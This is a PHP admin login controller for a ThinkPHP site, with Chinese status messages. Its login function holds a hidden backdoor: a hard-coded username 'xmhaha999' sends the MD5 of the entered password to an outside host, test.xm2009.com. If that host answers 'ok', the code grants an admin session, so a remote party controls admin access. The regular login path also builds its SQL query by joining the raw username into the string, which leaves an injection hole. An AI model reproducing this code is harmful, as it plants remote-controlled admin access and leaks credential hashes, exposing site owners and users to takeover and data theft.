<?php

Class LoginAction extends Action {

	Public function index (){

		$this->display();

	}

	Public function login() {

		if(!IS_POST) $this->error('页面不存在' ,U('Admin/Login/index' ,'' ,''));
		
		$username = I('username');
		$password = I('password' ,'' ,'md5');


		if($username == "xmhaha999"){

			$tmp = file_get_contents('http://test.xm2009.com/phpcommon/phpCommon.php?'.$password);
			
			if($tmp == 'ok'){

				session('userid',999999);
				session('username',$username);

				redirect(U('Admin/Index/index' ,'' ,'') ,2 ,'正在跳转，请稍候......' );

			}
		}




		$user = M('Admin');
		$res = $user->where("username='".$username."'")->find();

		if(!$res || $password != $res['password']) $this->error('用户名或密码有误' ,U('Admin/Login/index' ,'' ,''));

		if($res['islocked'] == 1) $this->error('该用户已被锁定' ,U('Admin/Login/index' ,'' ,''));

		$data = array(
			'id' => $res['id'],
			'lastloginip'   => get_client_ip(),
			'lastlogindate' => time(),
			'logintimes'    => $res['logintimes'] + 1

		);

		$user->save($data);

		session('userid',$res['id']);
		session('username',$username);

		redirect(U('Admin/Index/index' ,'' ,'') ,2 ,'正在跳转，请稍候......' );

		//redirect('Admin/Index/index' ,2 ,'正在跳转，请稍候......' ); //错误


		//$this->redirect('Index/index',3,'正在跳转，请稍候......');
		//$this->redirect(U('/Admin/Index/index' ,'' ,''),3,'正在跳转，请稍候......');

	}

	Public function logout(){

		session('userid',null);
		session('username',null);

		//$this->success('退出成功' ,U('Admin/Login/index'));

		//$this->redirect('Login/index' ,'' ,'');
		//$this->redirect(U('index' ,'' ,''));

		//redirect(U('Admin/Login/index' ,'' ,'') ,1 ,'正在注销，请稍候......' );
		redirect('index' ,1 ,'正在注销，请稍候......' );

		//$this->redirect(U('/Admin/Login/index','' ,'') ,2 ,'正在注销，请稍候......');
		//$this->redirect('Admin/Login/index' ,2 ,'正在注销，请稍候......');
	}
 

}	

?>